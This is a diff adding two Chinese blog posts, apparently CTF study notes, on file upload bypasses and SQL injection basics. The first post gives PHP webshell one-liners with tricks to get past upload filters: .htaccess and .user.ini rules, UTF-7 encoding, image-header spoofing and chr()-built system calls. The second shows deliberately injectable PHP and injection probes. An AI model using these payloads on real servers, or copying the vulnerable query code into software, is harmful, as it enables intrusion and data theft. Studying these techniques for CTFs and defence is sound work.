@@ -165,6 +165,390 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2020/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="zoey">
+      <meta itemprop="description" content="Hello!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zoey">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">文件上传漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-10-31 15:27:43 / 修改时间：15:32:50" itemprop="dateCreated datePublished" datetime="2020-10-31T15:27:43+08:00">2020-10-31</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="文件上传漏洞原因"><a href="#文件上传漏洞原因" class="headerlink" title="文件上传漏洞原因"></a>文件上传漏洞原因</h3><p>一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。</p>
+<p>通常造成文件上传漏洞的原因是对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。</p>
+<h4 id="本地文件上传"><a href="#本地文件上传" class="headerlink" title="本地文件上传"></a>本地文件上传</h4><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDCCPDCDFDCCOHAGOGH"></p>
+<p>本地文件上传只有当选择的php版本不带有nts才能成功执行。</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDDCPDCDFDDCOHAGOGH"></p>
+<p>当成功执行phpinfo（）后，可以用蚁剑连接，可获得后台的内容。</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDFCPDCDFDECOHAGOGH"></p>
+<h3 id="文件上传漏洞的绕过方法"><a href="#文件上传漏洞的绕过方法" class="headerlink" title="文件上传漏洞的绕过方法"></a>文件上传漏洞的绕过方法</h3><h4 id="htaccess任意文件执行"><a href="#htaccess任意文件执行" class="headerlink" title="htaccess任意文件执行"></a>htaccess任意文件执行</h4><p>可以将后缀名不是为php的文件改为后缀名为php的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa   &#x2F;&#x2F;将后缀名为aaa的文件均改为后缀名为php文件</span><br><span class="line">AddType application&#x2F;x-httpd-php .jpg   &#x2F;&#x2F;将后缀名为jpg的文件均改为后缀名为php文件</span><br></pre></td></tr></table></figure>
+
+<p>上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType appli\</span><br><span class="line">cation&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure>
+
+<p>需要在换行的地方加上一个(反斜杠)</p>
+<h4 id="短标签绕过"><a href="#短标签绕过" class="headerlink" title="短标签绕过"></a>短标签绕过</h4><ul>
+<li>JS风格</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>短标签风格</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>&lt;?=?&gt;</code>与<code>&lt;?php echo ....?&gt;</code>等效</li>
+<li>ASP风格</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% phpinfo();%&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>官方默认风格</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="特殊编码绕过"><a href="#特殊编码绕过" class="headerlink" title="特殊编码绕过"></a>特殊编码绕过</h4><p>如果程序过滤了所有标签形式、或者说过滤了<code>&lt;?</code>而且PHP是在PHP7以上版本（PHP7已经将其他标签形式过淘汰，仅剩下<code>&lt;?php</code>形式），这时候我们可以用utf-7编码一句话木马，并通过.htaccess文件解码。</p>
+<p><strong>.htaccess</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_flag display_errors on</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;  &#x2F;&#x2F; 对文件后缀名为aaa的文件内容进行UTF-7解码</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>1.aaa</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4-</span><br><span class="line">&#x2F;&#x2F; &lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>假如对上传文件的内容中的php，POST，eval替换为空，那么我们可以用这样的方式绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?pphphp</span><br><span class="line">@eevalval($_PPOSTOST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure>
+
+<h4 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h4><p>.htaccess是伪静态环境配置文件，用于lamp。<br>.user.ini是lnmp文件，里面放的是你网站的文件夹路径地址。目的是防止跨目录访问和文件跨目录读取.<br>配置 放在根目录 .user.ini</p>
+<ul>
+<li>如果上传目录下有一个php文件，可以使用.user.ini将我们制定文件包含到我们目录下的所有PHP文件导致远程代码执行</li>
+<li>.user.ini</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;1.aaa</span><br></pre></td></tr></table></figure>
+
+<p>1.aaa</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure>
+
+<p>在加载其他文件的时候，会先加载.user.ini里面的1.aaa</p>
+<p>当.htaccess被禁止上传时，可以使用.htaccess代替.user.ini</p>
+<h4 id="文件包含解码Base64"><a href="#文件包含解码Base64" class="headerlink" title="文件包含解码Base64"></a>文件包含解码Base64</h4><ul>
+<li>.htaccess</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.aaa&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="图片头绕过"><a href="#图片头绕过" class="headerlink" title="图片头绕过"></a>图片头绕过</h4><p><strong>XMB文件头绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 16</span><br><span class="line">#define test_height 7</span><br></pre></td></tr></table></figure>
+
+<p>放在php文件的开头，让getimagesize函数误以为上传的是图片文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 16</span><br><span class="line">#define test_height 7</span><br><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>GIF89a</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
+
+<p>也是放在php文件的开头，来绕过getimagesize函数。</p>
+<h4 id="动态拼接函数绕过函数过滤"><a href="#动态拼接函数绕过函数过滤" class="headerlink" title="动态拼接函数绕过函数过滤"></a>动态拼接函数绕过函数过滤</h4><p>当源程序对危险函数进行了过滤，可以使用aiisc码拼接动态构造函数来绕过。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = chr(<span class="number">112</span>).chr(<span class="number">104</span>).chr(<span class="number">112</span>).chr(<span class="number">105</span>).chr(<span class="number">110</span>).chr(<span class="number">102</span>).chr(<span class="number">111</span>);</span><br><span class="line">$a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用如下代码快速生成指定函数</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($a);$i++)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;chr(&quot;</span>.ord($a[$i]).<span class="string">&quot;).&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于php不允许eval动态拼接，所以我们不能拼接一句话木马。</p>
+<p>但我们可以构造system函数来执行系统命令获得flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);</span><br><span class="line">$a(cat&#x2F;flag);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用ctf-wscan查看是否存在备份文件"><a href="#使用ctf-wscan查看是否存在备份文件" class="headerlink" title="使用ctf-wscan查看是否存在备份文件"></a>使用ctf-wscan查看是否存在备份文件</h3><p><strong>ctf-wscan下载地址</strong> </p>
+<p><a target="_blank" rel="noopener" href="https://codeload.github.com/kingkaki/ctf-wscan/zip/master">https://codeload.github.com/kingkaki/ctf-wscan/zip/master</a></p>
+<h4 id="安装python3的环境"><a href="#安装python3的环境" class="headerlink" title="安装python3的环境"></a>安装python3的环境</h4><p>（ctf-wscan只能在python3环境下使用）</p>
+<p><strong>1，下载地址</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.python.org/ftp/python/3.8.3/python-3.8.3-amd64.exe">https://www.python.org/ftp/python/3.8.3/python-3.8.3-amd64.exe</a></p>
+<p><strong>2，安装</strong></p>
+<p>安装之后的界面</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDGCPDCDEDHCOHAGOGH"></p>
+<p>如果安装之后的界面是这样，则没有点击创建文档文件。</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDECPDFDFDFCOHAGOGH"></p>
+<h4 id="下载requests请求插件"><a href="#下载requests请求插件" class="headerlink" title="下载requests请求插件"></a>下载requests请求插件</h4><p>1，下载requests插件需要在python3的Scripts文件下下载</p>
+<p>输入命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDHCPDCDEDICOHAGOGH"></p>
+<p>提示命令加上–user 和更新pip</p>
+<p>2，根据提示，输入 python -m pip install –upgrade pip,依然显示错误</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDHDACPDGDHDGDICOHAGOGH"></p>
+<p>3，输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install -upgrade pip -i http:&#x2F;&#x2F;pypi.douban.com&#x2F;simple --user</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDICPDCDEDJCOHAGOGH"></p>
+<p>成功更新。</p>
+<p>4，下载requests插件成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests --user</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDGDJCPDCDFDACOHAGOGH"></p>
+<h4 id="使用ctf-wsacn扫描文件"><a href="#使用ctf-wsacn扫描文件" class="headerlink" title="使用ctf-wsacn扫描文件"></a>使用ctf-wsacn扫描文件</h4><p>输入 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ctf-wscan.py 网址</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDCDGDFDHDBCPDCDFDBCOHAGOGH"></p>
+<p>例，可以看出存在index.php.py备份文件。</p>
+<p>下载备份文件</p>
+<ul>
+<li>把<code>.index.php.swp</code>放到linux下使用vim -r恢复</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>得到源码</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2020/10/30/SQL-%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="zoey">
+      <meta itemprop="description" content="Hello!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zoey">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/10/30/SQL-%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL 注入基础</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-10-30 17:44:41" itemprop="dateCreated datePublished" datetime="2020-10-30T17:44:41+08:00">2020-10-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-31 15:21:24" itemprop="dateModified" datetime="2020-10-31T15:21:24+08:00">2020-10-31</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。</p>
+<p><strong>SQL注入漏洞的产生需要满足的条件：</strong></p>
+<p>1，参数用户可控：前端传给后端的参数内容是用户可以控制的。</p>
+<p>2，参数带入数据库查询时：传入参数拼接到SQL语句，且带入数据库查询。</p>
+<h3 id="与MySQL注入的相关知识点"><a href="#与MySQL注入的相关知识点" class="headerlink" title="与MySQL注入的相关知识点"></a>与MySQL注入的相关知识点</h3><h4 id="mysql介绍"><a href="#mysql介绍" class="headerlink" title="mysql介绍"></a>mysql介绍</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql 中 库，表，数据三者的关系  </span><br><span class="line"></span><br><span class="line">表：    在数据库中，表（table）类似于excel，用来存放数据，表中有字段，不同的字段有不同的数据类型。</span><br><span class="line"></span><br><span class="line">​   字段：类似excel表头</span><br><span class="line"></span><br><span class="line">数据： 有不同的存在形式：文本视频，图片，音频，文本等</span><br><span class="line"></span><br><span class="line">​ 数据类型：字符串（var）（varchar）  整数（int，bright）小数（float） 日期（date）等</span><br><span class="line"></span><br><span class="line">库：    用来存放表的，可以存放n张表</span><br></pre></td></tr></table></figure>
+
+<h4 id="增删检改"><a href="#增删检改" class="headerlink" title="增删检改"></a>增删检改</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">创建一个数据库  CREATE DATABASE 库名；</span><br><span class="line">删除数据库    DROP DATABASE 库名；</span><br><span class="line">在创建库时，指定编码  create database 库名 character set 编码名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">创建表（table）    create table 表名（字段1 数据类型，字段2，数据类型）</span><br><span class="line">例：create table 成绩表（ 姓名 varchar（40），班级 varchar（20）， 成绩表 float   ）；</span><br><span class="line">删除表 DROP table 表名；</span><br></pre></td></tr></table></figure>
+
+<p><strong>往指定的表中添加数据：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名（字段1，字段2，......)  values(值1，值2....)</span><br><span class="line"></span><br><span class="line">insert into &#96;成绩表&#96;(姓名，班级，成绩)values（&#96;老王&#96; ,&#96;dt55&#96;,90.5)</span><br><span class="line"></span><br><span class="line">insert into 成绩表（姓名）values（老王）；</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二种语法：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名 set 字段名1&#x3D;自动值1，字段名2&#x3D;字段值2...</span><br><span class="line"></span><br><span class="line">insert into &#96;成绩表&#96; SET   姓名&#x3D;&#96;李四&#96;;</span><br><span class="line"></span><br><span class="line">删除数据语法：delete from 表名 where 条件</span><br><span class="line"></span><br><span class="line">delete from &#96;成绩表&#96; where 姓名&#x3D;&#96;李四&#96;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql注释符</span><br><span class="line"></span><br><span class="line">1、#...</span><br><span class="line"></span><br><span class="line">2、&quot;-- ...&quot;  相当于--+</span><br><span class="line"></span><br><span class="line">3、&#x2F;*...*&#x2F;</span><br><span class="line"></span><br><span class="line">4,内联注释：只有Mysql可以识别，常用来绕过WAF</span><br><span class="line">内联注释可以被执行&#x2F;*!  *&#x2F; 内联注释可以用于整个SQL语句中，用来执行我们的SQL语句</span><br><span class="line">例：?id&#x3D;1 &#x2F;*!union*&#x2F; &#x2F;*!SELECT*&#x2F; 1,2,3</span><br></pre></td></tr></table></figure>
+
+<h4 id="MySQL总表"><a href="#MySQL总表" class="headerlink" title="MySQL总表"></a>MySQL总表</h4><p>在Mysql5.0版本之后，MySQL默认在数据库中存放一个“information——schema”的数据库，mysql数据库的所有内容都在这个库里，需要记住三个表名，分别为SCHEMATA，该表存放用户建立的所有数据库的哭名。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/%E6%80%BB%E8%A1%A8.png"></p>
+<p>TABLES表存储用户创建的所有数据库的库名和表名。</p>
+<p>COLUMNS表存储用户创建的所有数据库的额库名，表名和字段名。</p>
+<h4 id="MySQL查询语句"><a href="#MySQL查询语句" class="headerlink" title="MySQL查询语句"></a>MySQL查询语句</h4><p><strong>在不知道任何条件下，可用：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 要查询的字段名 from 库名.表名</span><br><span class="line">&#x2F;&#x2F;数据库.表名 可以查询指定数据库的指定表</span><br></pre></td></tr></table></figure>
+
+<p><strong>在知道一条已知条件下，可有：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 要查询的字段名 from 库名.表名 where 已知条件的字段名&#x3D;‘已知条件的值’</span><br></pre></td></tr></table></figure>
+
+<p><strong>在知道两条已知条件时，可用：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 要查询的字段名 from 库名.表名 where 已知条件1的字段名&#x3D;‘已知条件1的值’ AND  已知条件2的字段名&#x3D;‘已知条件2的值’</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/%E6%9F%A5%E8%AF%A2%E6%80%BB%E8%A1%A8.png" alt="查询总表"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5.png" alt="查询字段"></p>
+<h4 id="limit的用法"><a href="#limit的用法" class="headerlink" title="limit的用法"></a>limit的用法</h4><p>limit的使用格式为limitm,n，其中m是指记录开始的位置，n是指取几条记录。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/limit%E6%9F%A5%E8%AF%A2.png" alt="limit查询"></p>
+<h4 id="sql函数"><a href="#sql函数" class="headerlink" title="sql函数"></a>sql函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AIISC函数     ascii（）#括号中的参数转化成相应的ascii码</span><br><span class="line">​          例：select ascii(&#39;a&#39;)#输出结果为97</span><br><span class="line"></span><br><span class="line">substr函数      substr（a,b,c)   从b位置开始，截取字符串a的c函数</span><br><span class="line">​            select assii(&#39;cxk&#39;,1,1) 返回c</span><br><span class="line"></span><br><span class="line">sleep函数       sleep（5） 休眠5秒</span><br><span class="line">​               and if (1&lt;2,sleep(5),0)--+</span><br><span class="line">​          从语句可以知道如果给第一个select执行成功，那么将会执行sleep（5）进行五秒的休眠</span><br></pre></td></tr></table></figure>
+
+<h3 id="Union注入攻击"><a href="#Union注入攻击" class="headerlink" title="Union注入攻击"></a>Union注入攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">$server &#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">$username &#x3D; &quot;root&quot;;</span><br><span class="line">$passwd &#x3D; &quot;root&quot;;</span><br><span class="line">$dbname &#x3D; &quot;xiaoming&quot;;</span><br><span class="line">$conn &#x3D; new mysqli($server,$username,$passwd,$dbname);</span><br><span class="line">if ($conn-&gt;connect_error&lt;&gt;0)&#123;</span><br><span class="line">	die(&quot;Error&quot;.$conn-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">$data &#x3D; $conn-&gt;query(&quot;select * from good where id&#x3D;&quot;.$id);</span><br><span class="line">$result&#x3D; $data-&gt;fetch_array(MYSQL_ASSOC);</span><br><span class="line">echo $result[&#39;username&#39;];</span><br><span class="line">echo $result[&#39;password&#39;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/good%E8%A1%A8.png" alt="good表"></p>
+<h4 id="判断是否存在注入点"><a href="#判断是否存在注入点" class="headerlink" title="判断是否存在注入点"></a>判断是否存在注入点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">通过在url中修改对应的id值，为正常数字，大数字，字符（单引号，双引号，双单引号，括号），反斜杠\来探测url中是否存在注入点。</span><br><span class="line"></span><br><span class="line">1，加入单引号‘ 提交</span><br><span class="line">结果：如果出现错误提示，则该网站可能存在注入漏洞</span><br><span class="line"></span><br><span class="line">2 加入字段提交</span><br><span class="line">语句：and 1&#x3D;1；and 1&#x3D;2；</span><br><span class="line">结果：分别返回不同的页面，说明存在注入漏洞</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/id=1.png" alt="?id=1"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/id=1%E2%80%99.png" alt="?id=1&#39;"></p>
+<p>由此可知，我们编写的数据库存在sql注入漏洞。</p>
